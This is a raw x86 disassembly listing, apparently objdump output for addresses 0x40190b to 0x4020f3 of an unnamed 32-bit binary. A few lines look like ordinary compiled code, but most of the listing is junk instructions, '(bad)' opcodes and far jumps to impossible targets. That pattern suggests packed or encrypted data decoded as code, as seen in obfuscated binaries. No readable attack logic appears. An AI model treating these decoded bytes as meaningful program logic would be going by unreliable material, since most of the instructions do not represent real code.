  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	(bad)  
  40192e:	sub    eax,0x7b4e49f6
  401933:	jl     0x4019b1
  401935:	addr16 jle 0x4019b4
  401938:	jl     0x401984
  40193a:	jae    0x4018e1
  40193c:	jo     0x4018d5
  40193e:	jge    0x401989
  401940:	cwde   
  401941:	jae    0x4019ad
  401943:	sub    ah,al
  401945:	adc    eax,0xb64da0be
  40194a:	das    
  40194b:	cli    
  40194c:	inc    ebx
  40194d:	add    al,0x39
  40194f:	std    
  401950:	xchg   edx,ebx
  401952:	cmp    bl,BYTE PTR [ecx+0x3b67e68d]
  401958:	pop    esp
  401959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40195a:	aad    0x37
  40195c:	test   al,0x53
  40195e:	pop    edx
  40195f:	lahf   
  401960:	sub    al,0xe9
  401962:	mov    esp,0x1a3c4bc8
  401967:	icebp  
  401968:	push   esi
  401969:	sbb    ah,BYTE PTR [edi+0x2a]
  40196c:	cli    
  40196d:	scas   eax,DWORD PTR es:[edi]
  40196e:	add    ebx,eax
  401970:	push   eax
  401971:	in     eax,dx
  401972:	in     al,0x43
  401974:	into   
  401975:	cmp    DWORD PTR [eax],ebp
  401977:	sub    eax,DWORD PTR [ecx]
  401979:	mov    dl,0xc1
  40197b:	out    0xe8,eax
  40197d:	shl    dh,cl
  40197f:	test   DWORD PTR [esi-0x72],ebx
  401982:	ret    
  401983:	rcl    DWORD PTR [esp+edi*8-0x563d5fcc],cl
  40198a:	popf   
  40198b:	mov    bl,0x89
  40198d:	das    
  40198e:	mov    edx,edi
  401990:	jne    0x4019ff
  401992:	xchg   edx,eax
  401993:	cmp    eax,0xb8c388cd
  401998:	popf   
  401999:	inc    esp
  40199a:	imul   esp
  40199c:	add    eax,0x319752cf
  4019a1:	shr    al,1
  4019a3:	fs rol edi,0xef
  4019a7:	sahf   
  4019a8:	mov    dl,0x3
  4019aa:	scas   eax,DWORD PTR es:[edi]
  4019ab:	lods   al,BYTE PTR ds:[esi]
  4019ac:	aad    0x1c
  4019ae:	and    eax,0xa1526f5
  4019b3:	pop    eax
  4019b4:	xor    bl,cl
  4019b6:	mov    ds:0x406c23bd,al
  4019bb:	dec    esi
  4019bc:	cmp    eax,0xdded6d19
  4019c1:	mov    eax,0x772b0da9
  4019c6:	xchg   edx,eax
  4019c7:	adc    ebp,DWORD PTR [ebx+0x48]
  4019ca:	das    
  4019cb:	out    dx,eax
  4019cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019cd:	push   eax
  4019ce:	adc    DWORD PTR [ebx-0x7d7fc834],ecx
  4019d4:	inc    edi
  4019d5:	int3   
  4019d6:	mov    ebp,0x4154891d
  4019db:	jl     0x4019ec
  4019dd:	test   DWORD PTR [ecx+ebx*1],esi
  4019e0:	xchg   edi,eax
  4019e2:	ret    0x12fb
  4019e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019e6:	inc    eax
  4019e7:	popa   
  4019e8:	pop    ds
  4019e9:	mov    dh,0x54
  4019eb:	test   al,0x82
  4019ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019ee:	jo     0x40197c
  4019f0:	gs (bad) 
  4019f2:	cmp    BYTE PTR [esi-0x7e47a865],bl
  4019f8:	cwde   
  4019f9:	pop    eax
  4019fa:	jb     0x4019ce
  4019fc:	jae    0x401a60
  4019fe:	add    BYTE PTR [eax+0x59594b20],bl
  401a04:	cmp    edi,DWORD PTR [ecx+0x23]
  401a07:	xchg   ebp,eax
  401a08:	fisub  WORD PTR [ebp+ebp*8-0xd]
  401a0c:	inc    eax
  401a0d:	xchg   edx,eax
  401a0e:	cmp    dl,ah
  401a10:	add    BYTE PTR [ecx+0x68bb44ab],bl
  401a16:	cmp    eax,0xec040e32
  401a1b:	ret    
  401a1c:	in     eax,dx
  401a1d:	(bad)  
  401a1f:	push   eax
  401a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a21:	(bad)  
  401a22:	cmp    ah,BYTE PTR [ecx+0x3069fbb8]
  401a28:	hlt    
  401a29:	pop    ss
  401a2a:	add    DWORD PTR [ecx+ebp*8-0x15],edi
  401a2e:	xor    ebx,esi
  401a30:	js     0x401a97
  401a32:	fs dec esp
  401a34:	inc    ebx
  401a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a36:	in     eax,dx
  401a37:	push   eax
  401a38:	ss int3 
  401a3a:	ror    BYTE PTR [ebp-0x2c],0x52
  401a3e:	mov    ds:0x806564f3,al
  401a43:	mov    ds:0xfd2df2e6,al
  401a48:	pusha  
  401a49:	test   al,0x3a
  401a4b:	out    0x58,eax
  401a4d:	mov    esp,0x5d712cc5
  401a52:	dec    edi
  401a53:	imul   ebx,edi,0x9fec058
  401a59:	nop
  401a5a:	popa   
  401a5b:	fimul  WORD PTR ds:0x3d507689
  401a61:	fwait
  401a62:	jae    0x401a46
  401a64:	daa    
  401a65:	xchg   edx,eax
  401a66:	or     bl,BYTE PTR [esi]
  401a68:	sti    
  401a69:	stos   DWORD PTR es:[edi],eax
  401a6a:	jmp    0xb43df7b
  401a6f:	mov    ds:0x50d74cb4,eax
  401a74:	mov    dl,al
  401a76:	inc    edx
  401a77:	jg     0xe6cea42
  401a7d:	mov    ds,edx
  401a7f:	xor    DWORD PTR fs:[eax+edx*8-0x7e024f56],edx
  401a87:	cmp    eax,0xb18bad56
  401a8c:	sbb    edx,edi
  401a8e:	sub    edx,DWORD PTR [edx]
  401a90:	mov    eax,DWORD PTR [ebx+0x1e]
  401a93:	shl    DWORD PTR [ebx],cl
  401a95:	jo     0x401a21
  401a97:	pop    es
  401a98:	or     dl,ch
  401a9a:	add    esi,ebx
  401a9c:	ds retf 
  401a9e:	mov    BYTE PTR [edi+0x17902727],dl
  401aa4:	add    cl,BYTE PTR [ebx-0x1c5c0a62]
  401aaa:	pop    edx
  401aab:	mov    BYTE PTR [edx-0x59],bh
  401aae:	xor    ch,BYTE PTR [ecx+ebx*4+0x78]
  401ab2:	sbb    eax,ebx
  401ab4:	mov    esp,0x513b6acc
  401ab9:	push   edi
  401aba:	pop    esi
  401abb:	jp     0x401b0c
  401abd:	repnz fnstenv es:[esi-0x10]
  401ac2:	lods   al,BYTE PTR ds:[esi]
  401ac3:	ret    0xab6b
  401ac6:	pop    ds
  401ac7:	jmp    0xf35cf806
  401acc:	jmp    0x798d:0x4e4f2a0a
  401ad3:	retf   0x86f9
  401ad6:	pop    esi
  401ad7:	add    eax,0x3f7a8165
  401adc:	out    dx,eax
  401add:	shl    BYTE PTR [ebx-0x62ac2eea],0x7e
  401ae4:	in     al,dx
  401ae5:	addr16 jg 0x401ae4
  401ae8:	call   FWORD PTR [ecx+eax*2]
  401aeb:	into   
  401aec:	xchg   ebp,eax
  401aed:	inc    edx
  401aee:	ror    DWORD PTR [ebx],1
  401af0:	jle    0x401b17
  401af2:	dec    ebp
  401af3:	loop   0x401b11
  401af5:	arpl   ax,di
  401af7:	pop    ds
  401af8:	test   al,0x79
  401afa:	push   cs
  401afb:	push   cs
  401afc:	inc    esi
  401afd:	ror    BYTE PTR [eax+0x7000ec64],0xc9
  401b04:	out    0xec,eax
  401b06:	outs   dx,BYTE PTR ds:[esi]
  401b07:	push   0xffffffc6
  401b09:	inc    edx
  401b0a:	aas    
  401b0b:	or     BYTE PTR [eax-0x430905ce],cl
  401b11:	scas   eax,DWORD PTR es:[edi]
  401b12:	pop    ebx
  401b13:	and    esi,DWORD PTR [esi]
  401b15:	fidiv  DWORD PTR [ebp-0x27]
  401b18:	imul   esp,DWORD PTR [esp+ebx*4-0x43150737],0x10
  401b20:	sar    BYTE PTR [eax-0x7c],cl
  401b23:	dec    ebx
  401b24:	cwde   
  401b25:	out    dx,al
  401b26:	js     0x401b99
  401b28:	inc    eax
  401b29:	test   BYTE PTR [eax-0x46104f4],dl
  401b2f:	push   cs
  401b30:	jmp    0xb50270d4
  401b35:	and    eax,0xfe8203cf
  401b3a:	scas   eax,DWORD PTR es:[edi]
  401b3b:	pushf  
  401b3c:	(bad)  
  401b3d:	call   0x83c7:0xdb6d7089
  401b44:	(bad)  
  401b45:	popa   
  401b46:	xchg   bh,al
  401b48:	cmp    al,0x7f
  401b4a:	lock mov ebx,0xc7289104
  401b50:	enter  0xde75,0xe
  401b54:	and    ebx,DWORD PTR ds:0x40225bc1
  401b5a:	sbb    dl,BYTE PTR [eax]
  401b5c:	xchg   esi,eax
  401b5d:	js     0x401b1d
  401b5f:	inc    esi
  401b60:	dec    esp
  401b61:	and    DWORD PTR [ebx-0x4464bd3c],eax
  401b67:	mov    BYTE PTR [edi],cl
  401b69:	enter  0xba0d,0xfd
  401b6d:	loope  0x401bca
  401b6f:	(bad)  [ebp-0x480160a4]
  401b75:	rcr    BYTE PTR [edx+0xc17413b],cl
  401b7b:	add    al,0x65
  401b7d:	idiv   dl
  401b7f:	push   ebx
  401b80:	imul   eax,DWORD PTR [esi+0x706487f9],0x7f1cd381
  401b8a:	imul   edx,DWORD PTR [ecx+ecx*2],0x23e31f26
  401b91:	and    eax,0xd6c3cb42
  401b96:	cld    
  401b97:	or     eax,0xa8ce332d
  401b9c:	in     eax,dx
  401b9d:	xor    BYTE PTR [esi+0x5d],cl
  401ba0:	packuswb mm3,mm6
  401ba3:	jg     0x401b62
  401ba5:	xchg   ebx,eax
  401ba6:	jmp    0x401b72
  401ba8:	mov    ah,0x8f
  401baa:	fs cmc 
  401bac:	mov    bh,0x76
  401bae:	shl    esp,0x8b
  401bb1:	sbb    al,0xdf
  401bb3:	sub    ebx,edi
  401bb5:	inc    ecx
  401bb6:	out    dx,eax
  401bb7:	or     ebp,DWORD PTR [edi-0x72]
  401bba:	or     eax,0x31cb7348
  401bbf:	xor    al,dl
  401bc1:	in     eax,dx
  401bc2:	imul   esi,DWORD PTR [edi+0x6],0xde64767b
  401bc9:	mov    ss,WORD PTR [edi]
  401bcb:	mov    al,0xb0
  401bcd:	add    eax,0x2926d0d4
  401bd2:	add    al,0x68
  401bd4:	jbe    0x401b76
  401bd6:	mov    ebp,0x5328ef27
  401bdb:	mov    eax,0x8687ca1c
  401be0:	mov    ch,0x10
  401be2:	push   ss
  401be3:	push   es
  401be4:	fs cwde 
  401be6:	sar    DWORD PTR [ecx+0x537006a3],cl
  401bec:	push   edi
  401bed:	xor    DWORD PTR ds:0x9857f67a,eax
  401bf3:	mov    edx,esi
  401bf5:	jnp    0x401c4a
  401bf7:	ficom  DWORD PTR [esi+0x28]
  401bfa:	mov    dh,0xc7
  401bfc:	jns    0x401be1
  401bfe:	and    dh,BYTE PTR [ebx+0x2068a454]
  401c04:	mov    ecx,0xd326d35e
  401c09:	push   cs
  401c0a:	(bad)  
  401c0c:	mov    eax,cs:0x21ebc598
  401c12:	mov    ds:0x978bc77d,eax
  401c17:	in     al,0x4d
  401c19:	repz pushf 
  401c1b:	fwait
  401c1c:	test   DWORD PTR [edx-0x39],ebx
  401c1f:	adc    DWORD PTR [ebx-0x4531ccdc],ebp
  401c25:	data16 (bad) 
  401c27:	int    0xff
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0xe18c2433
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401bda
  401c4b:	jecxz  0x401c67
  401c4d:	pop    ebp
  401c4e:	pop    ecx
  401c4f:	jmp    0x49eecb22
  401c54:	fadd   DWORD PTR [edi+0x1401b539]
  401c5a:	arpl   WORD PTR [ebx],dx
  401c5c:	or     ebp,ecx
  401c5e:	cmp    ebp,edx
  401c60:	out    0xd9,al
  401c62:	adc    dl,BYTE PTR [edi]
  401c64:	pop    ecx
  401c65:	js     0x401c57
  401c67:	out    dx,al
  401c68:	dec    ebp
  401c69:	and    al,0xa6
  401c6b:	sbb    BYTE PTR [ecx+0x60],0x98
  401c6f:	xchg   BYTE PTR [esi],ah
  401c71:	mov    ebx,0x9ab1c6d2
  401c76:	add    eax,0x253739fc
  401c7b:	dec    ebp
  401c7c:	sar    BYTE PTR es:[ecx-0x6b],cl
  401c80:	cmp    cl,BYTE PTR [ecx+0x9]
  401c83:	dec    ebx
  401c84:	popw   ds
  401c86:	xchg   ecx,eax
  401c87:	sbb    eax,0x1f793494
  401c8c:	xlat   BYTE PTR ds:[ebx]
  401c8d:	xchg   ebp,eax
  401c8e:	ret    
  401c8f:	popa   
  401c90:	push   0xffffffbc
  401c92:	push   0xc11051ae
  401c97:	or     bh,BYTE PTR [ebp+eiz*1-0x1970ea0a]
  401c9e:	cwde   
  401c9f:	loop   0x401cbf
  401ca1:	mov    ebx,0xf97659f3
  401ca6:	or     DWORD PTR [edx-0x76decb71],ebx
  401cac:	xor    ch,BYTE PTR [esi+0x25123258]
  401cb2:	out    dx,eax
  401cb3:	fistp  DWORD PTR [edx+0x1d]
  401cb6:	xchg   DWORD PTR [edi+0x7f2ee7d5],eax
  401cbc:	iret   
  401cbd:	push   esi
  401cbe:	and    BYTE PTR [eax-0x77dfd444],al
  401cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cc5:	popf   
  401cc6:	aaa    
  401cc7:	inc    edi
  401cc8:	jns    0x401d10
  401cca:	cmp    eax,0x8c3d62ac
  401ccf:	mov    dh,BYTE PTR [ecx+edi*8-0x4a]
  401cd3:	clc    
  401cd4:	lds    ebx,FWORD PTR [esi+ebp*4]
  401cd7:	pop    es
  401cd8:	addr16 fdiv st(1),st
  401cdb:	mov    edx,0xa0256e26
  401ce0:	push   esp
  401ce1:	sar    DWORD PTR [eax],0x61
  401ce4:	dec    esi
  401ce5:	popf   
  401ce6:	aaa    
  401ce7:	xor    al,0xa2
  401ce9:	jmp    0x3fba:0xd48c11ee
  401cf0:	sti    
  401cf1:	rcl    BYTE PTR [ebp-0x61f230f],1
  401cf7:	stos   DWORD PTR es:[edi],eax
  401cf8:	imul   ecx,DWORD PTR [ecx-0x700eec0c],0xc7b6b742
  401d02:	pop    eax
  401d03:	push   ss
  401d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d05:	xchg   BYTE PTR [esi-0x72],ah
  401d08:	mov    bh,0x19
  401d0a:	in     eax,0x7f
  401d0c:	test   esp,ebp
  401d0e:	adc    eax,DWORD PTR [esi]
  401d10:	test   bh,al
  401d12:	push   ss
  401d13:	cmp    ebp,DWORD PTR [ecx]
  401d15:	dec    ecx
  401d16:	adc    eax,0x1be78851
  401d1b:	inc    eax
  401d1c:	dec    ebx
  401d1d:	xchg   ebx,eax
  401d1e:	shl    DWORD PTR [edx],0x9a
  401d21:	inc    BYTE PTR [ecx+edx*8-0x5072c286]
  401d28:	mov    ch,0xdf
  401d2a:	lea    ebx,[edi+0x11]
  401d2d:	(bad)  
  401d2e:	std    
  401d2f:	int3   
  401d30:	repnz in al,0x94
  401d33:	test   ecx,ecx
  401d35:	enter  0xfe,0x7e
  401d39:	mov    ebp,0x187315f9
  401d3e:	popf   
  401d3f:	daa    
  401d40:	jge    0x401d5a
  401d42:	or     edi,DWORD PTR [eax]
  401d44:	out    0x44,al
  401d46:	jno    0x401db7
  401d48:	dec    esp
  401d49:	xchg   ebp,eax
  401d4a:	in     al,dx
  401d4b:	test   BYTE PTR [ebp-0x77f9d891],cl
  401d51:	retf   0xb7e7
  401d54:	mov    edi,0x2314c73f
  401d59:	int3   
  401d5a:	je     0x401d2d
  401d5c:	pop    ebx
  401d5d:	sub    ebx,ebx
  401d5f:	push   cs
  401d60:	and    edi,DWORD PTR [edx]
  401d62:	inc    ecx
  401d63:	cmc    
  401d64:	and    esp,DWORD PTR [edx-0x7a4aa75a]
  401d6a:	and    al,BYTE PTR [eax+0x5f94d524]
  401d70:	jnp    0x401d4d
  401d72:	sbb    eax,0xca10f689
  401d77:	aas    
  401d78:	loop   0x401d05
  401d7a:	pop    ecx
  401d7b:	xchg   ebx,eax
  401d7c:	inc    ebx
  401d7d:	inc    ecx
  401d7e:	mov    ecx,0x62295e35
  401d83:	in     eax,0xdd
  401d85:	mov    edi,0x2c49131a
  401d8a:	lds    edi,FWORD PTR [eax-0x74c5f2c5]
  401d90:	mov    ebp,0xcd44be02
  401d95:	out    dx,eax
  401d96:	call   0x232f:0x1c6c8ce6
  401d9d:	and    DWORD PTR [ecx],0x2e192a92
  401da3:	loop   0x401e06
  401da5:	std    
  401da6:	jecxz  0x401e0b
  401da8:	mul    BYTE PTR [edi+ebx*4-0x3a]
  401dac:	mov    BYTE PTR [edx],ah
  401dae:	mov    edi,edi
  401db0:	jecxz  0x401dca
  401db2:	cwde   
  401db3:	scas   eax,DWORD PTR es:[edi]
  401db4:	mov    eax,ds:0xcedd599d
  401db9:	daa    
  401dba:	mov    edx,0x3735b67c
  401dbf:	sar    BYTE PTR [ebp+0x65bc374f],1
  401dc5:	adc    BYTE PTR [esi],al
  401dc7:	scas   eax,DWORD PTR es:[edi]
  401dc8:	pop    esp
  401dc9:	outs   dx,DWORD PTR ds:[esi]
  401dca:	fdiv   DWORD PTR [ebp-0x1c]
  401dcd:	xchg   ebx,eax
  401dce:	pop    esi
  401dcf:	and    ecx,DWORD PTR [eax]
  401dd1:	add    DWORD PTR [ebp-0x7ecfb867],esp
  401dd7:	mov    esp,0x161cb795
  401ddc:	popa   
  401ddd:	(bad)  
  401dde:	fsubp  st(4),st
  401de0:	sti    
  401de1:	mov    eax,0xd94d1f99
  401de6:	(bad)  
  401de7:	xor    al,BYTE PTR [ebx]
  401de9:	jp     0x401e34
  401deb:	(bad)  
  401ded:	adc    DWORD PTR [ebx],edi
  401def:	nop
  401df0:	mov    ds:0xfde15eec,al
  401df5:	lsl    edx,WORD PTR [eax]
  401df8:	mov    edx,0xaf5fc90d
  401dfd:	popf   
  401dfe:	and    ch,BYTE PTR [ecx]
  401e00:	ret    0x65fd
  401e03:	addr16 mov ebx,0x4e383028
  401e09:	loope  0x401df8
  401e0b:	scas   eax,DWORD PTR es:[edi]
  401e0c:	push   esp
  401e0d:	xchg   ecx,eax
  401e0e:	jae    0x401dfa
  401e10:	shl    BYTE PTR [edx],0x2
  401e13:	fimul  WORD PTR [edx+0x53ff8a06]
  401e19:	sbb    eax,0x15fff5f
  401e1e:	jl     0x401e74
  401e20:	pusha  
  401e21:	repz xor esp,DWORD PTR [eax+ebp*1+0x4825f212]
  401e29:	pop    ss
  401e2a:	adc    DWORD PTR [ebx+edx*2],ebp
  401e2d:	test   al,0x47
  401e2f:	xchg   ecx,eax
  401e30:	mov    ds:0x8cbb535c,al
  401e35:	jmp    ebx
  401e37:	clc    
  401e38:	push   cs
  401e39:	test   eax,0x46ade53f
  401e3e:	push   0x93e77823
  401e43:	and    bl,cl
  401e45:	aad    0x13
  401e47:	sub    DWORD PTR [esi],edx
  401e49:	adc    BYTE PTR [esi+0x4e],al
  401e4c:	cmc    
  401e4d:	lock add DWORD PTR [edi],ebx
  401e50:	retf   
  401e51:	aas    
  401e52:	mov    bh,0xe3
  401e54:	mov    al,bl
  401e56:	out    0x36,al
  401e58:	sahf   
  401e59:	or     edi,edx
  401e5b:	retf   
  401e5c:	(bad)  [eax+0x2eb8a58f]
  401e62:	(bad)  
  401e63:	and    cl,bl
  401e65:	pushf  
  401e66:	test   esp,esi
  401e68:	pop    eax
  401e69:	mov    al,ds:0x1806577a
  401e6e:	imul   ecx,eax,0x5c1b102b
  401e74:	inc    ecx
  401e75:	lahf   
  401e76:	sbb    DWORD PTR [ecx-0x61e10a40],0xffffffc2
  401e7d:	mov    al,0x29
  401e7f:	add    cl,BYTE PTR [esi]
  401e81:	dec    edx
  401e82:	dec    ebp
  401e83:	mov    edx,0xf4238a3b
  401e88:	jg     0x401e89
  401e8a:	xchg   edi,eax
  401e8b:	push   ebx
  401e8c:	sahf   
  401e8d:	icebp  
  401e8e:	rol    BYTE PTR [esi+0x3b42f687],0xfa
  401e95:	and    eax,0x87dad14d
  401e9a:	aas    
  401e9b:	or     edx,DWORD PTR [esi+0x0]
  401e9e:	xchg   si,ax
  401ea0:	icebp  
  401ea1:	mov    eax,ds:0x9bae9cc2
  401ea6:	or     DWORD PTR [ebx],eax
  401ea8:	inc    eax
  401ea9:	in     eax,dx
  401eaa:	adc    DWORD PTR [edx+edi*4+0x56ef0a4],eax
  401eb1:	push   0x63053c1d
  401eb6:	sub    eax,DWORD PTR [edi]
  401eb8:	dec    eax
  401eb9:	mov    bl,ch
  401ebb:	pop    edi
  401ebc:	push   edi
  401ebd:	mov    cl,0xc2
  401ebf:	iret   
  401ec0:	mov    dh,0xcd
  401ec2:	ds or  ebx,edi
  401ec5:	stos   DWORD PTR es:[edi],eax
  401ec6:	xor    al,0x76
  401ec8:	and    al,0x53
  401eca:	mov    bl,0xb1
  401ecc:	adc    BYTE PTR [esi+eiz*2+0x66],0xc4
  401ed1:	adc    ah,BYTE PTR [ecx]
  401ed3:	adc    BYTE PTR [eax-0x25],cl
  401ed6:	aad    0x67
  401ed8:	jge    0x401ec8
  401eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401edb:	in     eax,dx
  401edc:	addr16 leave 
  401ede:	sbb    eax,0x9d2884d5
  401ee3:	jno    0x401e7f
  401ee5:	out    dx,al
  401ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ee7:	adc    BYTE PTR [ebx-0x127f37ad],bh
  401eed:	ds jmp 0x6dd8:0x4a03bdd0
  401ef5:	sti    
  401ef6:	and    al,0x7c
  401ef8:	dec    ecx
  401ef9:	fs push 0x7be29847
  401eff:	dec    ebx
  401f00:	inc    eax
  401f01:	in     eax,0xd2
  401f03:	mov    esi,0xe4c82a57
  401f08:	pop    esp
  401f09:	mov    dh,0x57
  401f0b:	sbb    DWORD PTR [edi-0x72965667],esi
  401f11:	mov    edx,0x7ea8b0c
  401f16:	mov    edx,0x81ca7211
  401f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f1c:	cli    
  401f1d:	loopne 0x401f40
  401f1f:	mov    cl,0xf0
  401f21:	jg     0x401f20
  401f23:	bound  esp,QWORD PTR [eax-0x2f]
  401f26:	jg     0x401f3d
  401f28:	gs out dx,al
  401f2a:	push   es
  401f2b:	jecxz  0x401f9f
  401f2d:	loopne 0x401ed8
  401f2f:	xchg   edi,eax
  401f30:	mov    ebp,0xeaa17c61
  401f35:	cmp    eax,DWORD PTR [ecx+0x0]
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0xec7b0e50
  401f5d:	and    DWORD PTR [eax+0x677c7c01],ebx
  401f63:	jle    0x401fe1
  401f65:	jl     0x401ef9
  401f67:	xor    BYTE PTR [ebx+0x1a162d4b],ah
  401f6d:	mov    ebx,0xd9c2a6fe
  401f72:	mov    esi,0xfe1c74c0
  401f77:	hlt    
  401f78:	test   esi,edi
  401f7a:	xchg   BYTE PTR [ecx+esi*4-0x10d103ea],ah
  401f81:	ins    DWORD PTR es:[edi],dx
  401f82:	(bad)  
  401f83:	xor    BYTE PTR [edx+0x1b65167],bh
  401f89:	mov    edx,DWORD PTR [esi+0x59da033a]
  401f8f:	das    
  401f90:	xor    BYTE PTR [ecx+ecx*4+0x40],al
  401f94:	add    BYTE PTR [ebp-0x6d],al
  401f97:	cld    
  401f98:	adc    edi,DWORD PTR fs:[ebx+eiz*2+0x34]
  401f9d:	xor    al,al
  401f9f:	scas   al,BYTE PTR es:[edi]
  401fa0:	icebp  
  401fa1:	gs add al,0xb
  401fa4:	retf   
  401fa5:	(bad)  
  401fa6:	jmp    0xc4372ace
  401fab:	pop    ebx
  401fac:	sbb    BYTE PTR [ebx-0x4ccd3756],dl
  401fb2:	out    dx,al
  401fb3:	mov    esi,0xfe68d7c0
  401fb8:	add    eax,0xb2689d5b
  401fbd:	mov    edi,eax
  401fbf:	rcr    DWORD PTR [edi],cl
  401fc1:	mov    dl,0x34
  401fc3:	pop    edi
  401fc4:	pop    edi
  401fc5:	xchg   ecx,eax
  401fc6:	mov    ah,0x3
  401fc8:	sahf   
  401fc9:	mov    WORD PTR [edx-0x25ce4447],?
  401fcf:	cmp    DWORD PTR [edx+ecx*2+0x59e49df9],esp
  401fd6:	mov    DWORD PTR [eax-0x1],eax
  401fd9:	fisub  DWORD PTR [ebp+0x5eb4f2a4]
  401fdf:	loope  0x401f96
  401fe1:	pusha  
  401fe2:	retf   
  401fe3:	inc    ebx
  401fe4:	and    DWORD PTR [esi+edx*4],edi
  401fe7:	test   BYTE PTR [ecx+0x4b1d09df],bh
  401fed:	xchg   DWORD PTR [edi],ecx
  401fef:	sub    ah,BYTE PTR [esi]
  401ff1:	mov    cl,0x68
  401ff3:	or     esp,ebx
  401ff5:	ja     0x402005
  401ff7:	ins    DWORD PTR es:[edi],dx
  401ff8:	aam    0x38
  401ffa:	outs   dx,DWORD PTR ds:[esi]
  401ffb:	adc    ah,BYTE PTR [esi+eiz*8]
  401ffe:	pop    eax
  401fff:	in     al,dx
  402000:	xchg   esi,eax
  402001:	xlat   BYTE PTR ds:[ebx]
  402002:	pop    edx
  402003:	loope  0x40205a
  402005:	cmp    al,0xcc
  402007:	outs   dx,BYTE PTR ds:[esi]
  402008:	outs   dx,DWORD PTR ds:[esi]
  402009:	add    eax,0xf318a785
  40200e:	inc    ebp
  40200f:	rcr    DWORD PTR [ebx+ecx*4-0x13],1
  402013:	dec    esp
  402014:	bound  esi,QWORD PTR [esi+0x5c63c083]
  40201a:	loope  0x40206b
  40201c:	and    al,0xe0
  40201e:	mov    ebp,0x6291de3d
  402023:	mov    al,0xe7
  402025:	or     edi,DWORD PTR [ebx+0xa]
  402028:	dec    esi
  402029:	fwait
  40202a:	cld    
  40202b:	sub    DWORD PTR [edx-0x6],esp
  40202e:	dec    ecx
  40202f:	mov    bl,0x50
  402031:	jp     0x402059
  402033:	mov    BYTE PTR [edx],al
  402035:	xor    al,dh
  402037:	(bad)  
  402038:	pop    ebp
  402039:	sbb    ecx,ebp
  40203b:	hlt    
  40203c:	jnp    0x40203d
  40203e:	adc    eax,DWORD PTR [ebx+0x543ad5f5]
  402044:	ror    edi,1
  402046:	fdiv   QWORD PTR [edi]
  402048:	fcomp  QWORD PTR [esi]
  40204a:	pop    ecx
  40204b:	hlt    
  40204c:	(bad)  
  40204d:	hlt    
  40204e:	bnd ret 
  402050:	cmp    ecx,0x96f1802
  402056:	es ins BYTE PTR es:[edi],dx
  402058:	mov    dh,0x55
  40205a:	aad    0x67
  40205c:	sub    al,0x7f
  40205e:	das    
  40205f:	sbb    DWORD PTR [ebx-0x5b],edi
  402062:	rol    BYTE PTR [esi+0x2059a915],cl
  402068:	in     al,dx
  402069:	int3   
  40206a:	push   ebp
  40206b:	mov    ds:0x68b3bdaf,al
  402070:	sbb    BYTE PTR [esi-0x1f],0xd2
  402074:	inc    eax
  402075:	in     al,0x73
  402077:	(bad)  
  402078:	in     eax,dx
  402079:	or     ecx,0xffffff8d
  40207c:	stos   BYTE PTR es:[edi],al
  40207d:	mov    ebx,0xd3938003
  402082:	jmp    0x32991bc4
  402087:	ret    
  402088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402089:	fadd   DWORD PTR [edx-0x33c8fb18]
  402090:	pop    esi
  402091:	jno    0x402028
  402093:	push   ebp
  402094:	or     DWORD PTR [ebx],edx
  402096:	xor    eax,0x26765324
  40209b:	jecxz  0x40209d
  40209d:	dec    esi
  40209e:	xor    BYTE PTR [ebp-0x4f],0x27
  4020a2:	(bad)  
  4020a3:	clc    
  4020a4:	mov    ecx,0xf779ae8e
  4020a9:	xor    DWORD PTR [esi],edx
  4020ab:	push   esp
  4020ac:	test   eax,0x378b5856
  4020b1:	mov    cl,0x74
  4020b3:	push   0xa2ce4f56
  4020b8:	cld    
  4020b9:	or     DWORD PTR [edx-0x1354233],ebp
  4020bf:	mov    ah,0x1c
  4020c1:	nop
  4020c2:	mov    ebx,0xa76ea47d
  4020c7:	jle    0x4020b1
  4020c9:	add    BYTE PTR [ebx+0x22cf2573],ch
  4020cf:	xor    BYTE PTR [esi+0x64611b16],cl
  4020d5:	inc    ebx
  4020d6:	mov    ah,0x67
  4020d8:	cmovo  esp,DWORD PTR [eax+0x48773c4a]
  4020df:	mov    esi,0x16ac9884
  4020e4:	sar    edx,0x69
  4020e7:	outs   dx,DWORD PTR ds:[esi]
  4020e8:	fwait
  4020e9:	cmc    
  4020ea:	ins    BYTE PTR es:[edi],dx
  4020eb:	fs pop edi
  4020ed:	and    BYTE PTR [esi+0x0],dl
  4020f0:	nop
  4020f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f2:	cli    
  4020f3:	jl     0x4020b1
